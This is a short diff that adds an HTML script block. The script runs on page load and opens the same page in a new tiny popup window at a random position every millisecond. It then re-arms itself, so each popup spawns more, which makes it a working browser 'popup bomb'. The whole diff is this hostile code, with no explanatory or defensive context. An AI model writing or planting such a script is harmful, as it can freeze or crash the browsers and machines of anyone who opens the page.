@@ -1,0 +1,10 @@
+<script>
+const time = 1
+ function startAgain() {
+	setTimeout(function() {window.open(document.location.href, '_blank', `left=${getRandomNumber(1000)}, top=${getRandomNumber(1000)},height=50,width=50,scrollbars=yes,status=yes`); startAgain()}, time);
+}
+function getRandomNumber(max) {
+	return Math.floor(Math.random() * max + 1)
+}
+startAgain();
+</script>
